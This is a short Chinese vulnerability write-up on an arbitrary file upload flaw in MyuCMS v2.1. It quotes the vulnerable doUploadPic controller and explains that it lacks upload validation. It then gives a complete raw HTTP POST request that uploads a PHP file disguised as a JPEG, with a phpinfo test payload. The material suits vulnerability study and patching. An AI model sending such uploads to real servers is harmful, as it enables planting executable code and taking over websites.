MyuCMS v2.1 文件上传漏洞
========================

一、漏洞简介
------------

二、漏洞影响
------------

MyuCMS v2.1

三、复现过程
------------

CNVD 上对应的标题为 **myucms fo\*\*\*.php页面存在文件上传漏洞**

搜索项目中fo开头的文件，定位到
**application/admin/controller/Forum.php** 中的 **doUploadPic** 方法

    public function doUploadPic()
        {
            $file = request()->file('FileName');
            $info = $file->move(ROOT_PATH . DS . 'uploads');
            if($info){
                $path = WEB_URL . DS . 'uploads' . DS .$info->getSaveName();
                echo str_replace("\\","/",$path);
            }
        }

可以看到上述代码调用了 **Thinkphp** 内置的 **move**
方法来对上传的文件进行处理。但是在调用 **move** 方法前未调用
**validate()** 方法来设置验证规则。以至于此处形成了任意文件上传漏洞。

### Payload

根据 **doUploadPic()** 方法构建 **Payload数据包** 如下：

    POST /admin/forum/doUploadPic HTTP/1.1
    Host: www.0-sec.org
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Content-Type: multipart/form-data; boundary=---------------------------18467633426500
    Cookie: PHPSESSID=l6ijpio06mqmhcdq654g63eq90; UM_distinctid=170343d2b4a291-0a4e487f247e62-4c302978-1fa400-170343d2b4b28f; CNZZDATA1277972876=1874892142-1581419669-%7C1581432904
    Upgrade-Insecure-Requests: 1
    Content-Length: 206

    -----------------------------18467633426500
    Content-Disposition: form-data; name="FileName"; filename="1.php"
    Content-Type: image/jpeg

    <?php phpinfo(); ?>
    -----------------------------18467633426500--

参考链接
--------

> https://xz.aliyun.com/t/7271\#toc-0
